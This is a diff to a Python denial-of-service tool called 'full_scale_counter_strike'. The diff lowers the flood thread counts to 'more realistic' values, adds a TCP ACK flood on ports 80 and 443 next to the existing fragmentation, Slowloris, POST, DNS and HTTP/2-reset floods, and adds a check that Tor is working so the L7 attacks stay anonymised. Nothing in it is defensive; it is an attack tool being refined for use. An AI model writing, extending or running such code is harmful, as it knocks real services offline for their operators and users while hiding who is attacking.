@@ -92,11 +92,11 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
     stop_event, pause_event = threading.Event(), threading.Event()
     attack_threads = []
 
-    # --- Parameters for a long-running, high-intensity siege ---
+    # --- REVISED, more realistic parameters for the siege ---
     params = {
-        "threads": 250,
-        "slowloris_sockets": 200,
-        "h2_threads": 50,
+        "threads": 80,  # Drastically reduced for floods
+        "slowloris_sockets": 150,  # Still high, as these are lightweight
+        "h2_threads": 20,  # Still very effective with fewer threads
         "duration": 360,
     }
     print(
@@ -116,6 +116,10 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
     for port in [80, 443]:
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_tcp_fragmentation, args))
+    # NEW: TCP ACK Flood on common web ports
+    for port in [80, 443]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], network_interface)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_ack_flood, args))
 
     # --- Launch Application Layer Floods (L7) ---
     print("[+] Preparing L7 vectors (DNS Query, POST Flood, Slowloris, H2 Reset)...")
@@ -246,8 +250,12 @@ if __name__ == "__main__":
     proxy_choice = input("Enable SOCKS Proxy (Tor) for L7 attacks (y/n): ").lower()
     proxy_enabled = True if proxy_choice == 'y' else False
     if proxy_enabled:
-        print("[!] Proxy enabled. L7 attacks will be slower but anonymized.")
-        print("[!] Ensure the Tor service (or other SOCKS5 proxy) is running on 127.0.0.1:9050.")
+        # --- NEW: Check if the Tor connection is actually working ---
+        if not counter_strike_helper.check_tor_connection():
+            print("[ERROR] Tor is not working correctly. Disabling proxy for this session.")
+            proxy_enabled = False
+        else:
+            print("[!] Tor enabled. L7 attacks will be slower but anonymized.")
 
     try:
         options_text = """
